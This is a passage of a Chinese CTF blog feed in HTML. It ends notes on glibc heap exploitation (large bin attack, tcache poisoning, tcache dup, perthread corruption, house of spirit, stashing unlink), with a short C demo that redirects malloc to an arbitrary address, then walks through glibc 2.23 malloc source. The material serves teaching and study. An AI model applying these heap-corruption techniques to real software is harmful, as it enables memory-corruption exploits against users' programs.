*)stack_var2);</span><br><span class="line"><span class="number">38</span> </span><br><span class="line"><span class="number">39</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">40</span> &#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211362.png" alt="在这里插入图片描述"></p><p><strong>stack_var1和stack_var2中的值已经被修改成了P3的头指针</strong></p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>可以修改一个 large bin chunk 的 data</strong></li><li><strong>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</strong></li><li><strong>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</strong></li><li><strong>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。</strong></li></ul><h2 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>内存分配的 malloc 函数中有多处，会将内存块移入 tcache 中。</p><p><strong>（1）首先，申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。</strong></p><p><strong>（2）其次，申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。</strong></p><p><strong>（3）当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。</strong></p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即<strong>可实现 malloc 到任何地址</strong>。</p><p>tcache的next指针与fd指针在同一位置</p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> target;</span><br><span class="line"><span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;target;</span><br><span class="line"><span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc_point is target: %p\n&quot;</span>, c);</span><br></pre></td></tr></table></figure><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>tcache_put() 的检查可以忽略不计</p><h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><p>因为没有任何检查，所以我们可以<strong>对同一个 chunk 多次 free，造成 cycliced list。</strong></p><p>最新的 <strong>libc 2.29</strong> 的 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hp=6d7a6a8cabb4edbf00881cb7503473a8ed4ec0b7;hb=bcdaad21d4635931d1bd3b54a7894276925d081d;hpb=5770c0ad1e0c784e817464ca2cf9436a58c9beb7">commit</a> 中更新了 Tcache 的 double free 的 check</p><p>目前为止，只看到了<strong>在 free 操作的时候的 check</strong> ，似乎没有对 get 进行新的 check。</p><h2 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h2><h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p><code>tcache_perthread_struct</code> 是整个 tcache 的管理结构</p><h3 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h3><p>设想有如下的堆排布情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_    +------------+</span><br><span class="line">\perthread |......      |</span><br><span class="line">\_struct   +------------+</span><br><span class="line">           |counts[i]   |</span><br><span class="line">           +------------+</span><br><span class="line">           |......      |          +----------+</span><br><span class="line">           +------------+          |header    |</span><br><span class="line">           |entries[i]  |---------&gt;+----------+</span><br><span class="line">           +------------+          |<span class="literal">NULL</span>      |</span><br><span class="line">           |......      |          +----------+</span><br><span class="line">           |            |          |          |</span><br><span class="line">           +------------+          +----------+</span><br></pre></td></tr></table></figure><p>通过一些手段（如 <code>tcache posioning</code>），我们将其改为了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_    +------------+&lt;---------------------------+</span><br><span class="line">\perthread |......      |                            |</span><br><span class="line">\_struct   +------------+                            |</span><br><span class="line">           |counts[i]   |                            |</span><br><span class="line">           +------------+                            |</span><br><span class="line">           |......      |          +----------+      |</span><br><span class="line">           +------------+          |header    |      |</span><br><span class="line">           |entries[i]  |---------&gt;+----------+      |</span><br><span class="line">           +------------+          |target    |------+</span><br><span class="line">           |......      |          +----------+</span><br><span class="line">           |            |          |          |</span><br><span class="line">           +------------+          +----------+</span><br></pre></td></tr></table></figure><p>这样，两次 malloc 后我们就返回了 <code>tcache_perthread_struct</code> 的地址，就可以控制整个 tcache 了。</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h2><h3 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h3><p>由于tcache_put()函数检查不严格造成的，在释放的时候没有检查被释放的指针是否真的是堆块的malloc指针，如果我们<strong>构造一个size符合tcache bin size的fake_chunk</strong>，那么理论上讲其实<strong>可以将任意地址作为chunk进行释放</strong>。</p><h2 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h2><p>在 2.26 之后的 libc 版本后，我们首先得先把 tcache 填满</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><h3 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h3><p><strong>简单来说就是在smallbin里面构造一个至少两个bin的chunk链，其中最后进入的(因为smallbin是FIFO)chunk的bk指向任意地址，那么smallbin就构造成了多一个chunk的链这时候calloc一个chunk，其余chunk进入tcache(保证刚好够得到任意地址进入tcache)，那么此时再malloc一个chunk，就malloc到了任意地址，就是先对任意地址的修改</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;All-bug的利用条件，相关检查，相关例子和小手法&quot;&gt;&lt;a href=&quot;#All-bug的利用条件，相关检查，相关例子和小手法&quot; class=&quot;headerlink&quot; title=&quot;All bug的利用条件，相关检查，相关例子和小手法&quot;&gt;&lt;/a&gt;All bug的</summary>
      
    
    
    
    <category term="总结" scheme="http://s1nec-1o.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>malloc/free源码实现</title>
    <link href="http://s1nec-1o.github.io/2024/02/29/malloc-free%E6%BA%90%E7%A0%81%E5%AE%9E%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/02/29/malloc-free%E6%BA%90%E7%A0%81%E5%AE%9E%E7%8E%B0/</id>
    <published>2024-02-29T10:15:31.000Z</published>
    <updated>2024-04-28T14:13:31.759Z</updated>
    
    <content type="html"><![CDATA[<h1 id="细读源码"><a href="#细读源码" class="headerlink" title="细读源码"></a>细读源码</h1><p>“Public wrappers”（公共包装器）通常指的是在软件开发中用于封装和提供对外部（公共）接口的函数或类。这些包装器函数或类可以隐藏底层实现的细节，提供更简单、更易用的接口，以方便其他开发人员使用。</p><h1 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc-2.23"></a>glibc-2.23</h1><p>首先在读源码前要先了解一些核心结构</p><p>mchunkptr是chunk的指针</p><h2 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="comment">/* 序列化访问 */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="comment">/* 标志位（以前在 max_fast 中） */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="comment">/* 如果 fastbin 块包含最近插入的空闲块，则设置为 1 */</span></span><br><span class="line">  <span class="comment">/* 注意，这是一个布尔值，但并非所有目标平台都支持对布尔值的原子操作 */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  <span class="comment">/* 最顶层块的基址 -- 不在任何 bin 中 */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  <span class="comment">/* 最近一次拆分小型请求产生的剩余块 */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  <span class="comment">/* 正常 bins，按照上述描述进行打包 */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="comment">/* bins 的位图 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="comment">/* 链表 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="comment">/* 用于空闲 arenas 的链表。访问该字段由 arena.c 中的 free_list_lock 进行序列化 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">   <span class="comment">/* 附加到该 arena 的线程数。如果该 arena 在空闲列表中，则为 0。访问该字段由 arena.c 中的              free_list_lock 进行序列化 */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  <span class="comment">/* 在该 arena 中从系统分配的内存 */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>mstate是arena的指针</p><p>Linux中提供一把<strong>互斥锁mutex</strong>（<strong>也称之为互斥量</strong>）。</p><p>每个线程在对资源操作前都尝试先加锁，成功加锁才能操作，操作结束解锁。</p><p>但通过“锁”就将资源的访问变成互斥操作，而后与时间有关的错误也不会再产生了。</p><h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure><p> 可以分为三个主要部分：主要包含<strong>callback、arena_get、_int_malloc</strong>，我们把<strong>callback和arena_get当作初始化</strong>的过程，_<strong>int_malloc作为实际分配</strong>的过程，接下来就一步一步分析</p><h3 id="callback"><a href="#callback" class="headerlink" title="callback"></a>callback</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">  = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>其中的<code>atomic_forced_read(__malloc_hook)</code>的宏定义是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> atomic_forced_read(x) \</span></span><br><span class="line"><span class="meta">  (&#123; __typeof (x) __x; __asm (<span class="string">&quot;&quot;</span> : <span class="string">&quot;=r&quot;</span> (__x) : <span class="string">&quot;0&quot;</span> (x)); __x; &#125;)</span></span><br></pre></td></tr></table></figure><p>这样的，主要是用内联汇编的手段，来使得该段用的是强制读取的原子操作，能够避免多线程的干扰</p><p>而<code>__builtin_expect(x,y)</code>这个语句的参数x是一个式子，而y表示期望值，能够使得编译器编译出更加效率的文件，而y&#x3D;0表示这个式子x基本不可能发生，但是也是有可能发生的</p><p>hook是一个函数指针变量，被赋值成了__malloc_hook，后者定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__malloc_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span> = malloc_hook_ini;</span><br></pre></td></tr></table></figure><p>__malloc_hook被初始化成了malloc_hook_ini，后者定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">malloc_hook_ini</span> <span class="params">(<span class="type">size_t</span> sz, <span class="type">const</span> <span class="type">void</span> *caller)</span> &#123;</span><br><span class="line">  __malloc_hook = <span class="literal">NULL</span>;</span><br><span class="line">  ptmalloc_init ();</span><br><span class="line">  <span class="keyword">return</span> __libc_malloc (sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<strong>malloc_hook又被赋值成了NULL，然后再重新调用</strong>libc_malloc，这样就可以保证在多次调用__libc_malloc的情况下，代码1中的hook回调函数只会被调用一次，如下图所示：</p><p><a href="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_170117.png"><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282213185.png" alt="img"></a></p><p>而其中<code>ptmalloc_init</code>的精简定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  __malloc_initialized = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  thread_arena = &amp;main_arena;</span><br><span class="line">  </span><br><span class="line">  __malloc_initialized = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过__malloc_initialized这个全局flag来检测是不是已经初始化过，如果没有，则把main_arena设成当前的thread_arena，这是因为初始化肯定是主线程在做，而主线程用的是main_arena，然后再回到<code>malloc_hook_ini</code>执行<code>__libc_malloc</code>回到函数中继续执行调用malloc</p><p>第一次调用 malloc 函数时函数调用路径如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> -&gt; __libc_malloc -&gt; __malloc_hook(即malloc_hook_ini) -&gt; ptmalloc_init -&gt; __libc_malloc -&gt; _int_malloc</span><br></pre></td></tr></table></figure><p>以后用户再调用 malloc 函数的时候，路径将是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> -&gt; __libc_malloc -&gt; _int_mallocc</span><br></pre></td></tr></table></figure><h3 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));  <span class="comment">//over</span></span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>下一个执行的便是<code>arena_get</code>宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* arena_get() acquires an arena and locks the corresponding mutex.</span></span><br><span class="line"><span class="comment">   First, try the one last locked successfully by this thread.  (This</span></span><br><span class="line"><span class="comment">   is the common case and handled with a macro for speed.)  Then, loop</span></span><br><span class="line"><span class="comment">   once over the circularly linked list of arenas.  If no arena is</span></span><br><span class="line"><span class="comment">   readily available, create a new one.  In this latter case, `size&#x27;</span></span><br><span class="line"><span class="comment">   is just a hint as to how much memory will be required immediately</span></span><br><span class="line"><span class="comment">   in the new arena. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      ptr = thread_arena;      \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_lock(ptr, size) do &#123;      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (ptr &amp;&amp; !arena_is_corrupt (ptr))      \</span></span><br><span class="line"><span class="meta">        (void) mutex_lock (&amp;ptr-&gt;mutex);      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">else</span>      \</span></span><br><span class="line"><span class="meta">        ptr = arena_get2 ((size), NULL);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>这上面的注释是一段解释说明它首先尝试获取上次由该线程成功锁定的arena，这是一种常见情况，并且使用宏来提高速度。如果没有可用的arena，就会循环遍历arena的循环链表，直到找到一个可用的arena。如果仍然没有可用的arena，则会创建一个新的arena，其中的<code>size</code>参数只是一个关于新arena所需内存量的提示。</p><p>该过程大致如下，其中arena_get2函数的作用是最重要的，包含了三个重要的函数<code>get_free_list</code>，<code>_int_new_arena</code>，<code>reused_arena</code></p><img src="https://img.hijwei.top/2/24/65e059ebb9cca.png" alt="image-20240226192907334" style="zoom:50%;" /><p>做题只会遇到main_arena(libc自带的)，而main_arena没有heap_info对应着不用新创建一个arena</p><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>之后便是调用<code>_int_malloc</code>了</p><p>先是初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* 规范化的请求大小 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* 关联的bin索引 */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* 关联的bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* 检查/选中的块 */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* 块的大小 */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* 块的bin索引 */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* 拆分后的剩余块 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* 剩余块的大小 */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* 位图遍历器 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* 位图遍历器 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* 当前binmap的字 */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* 链接的临时变量 */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* 链接的临时变量 */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> errstr = <span class="literal">NULL</span>;  </span><br></pre></td></tr></table></figure><p>之后便是修改bytes使其合法化，nb就是转换后的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span 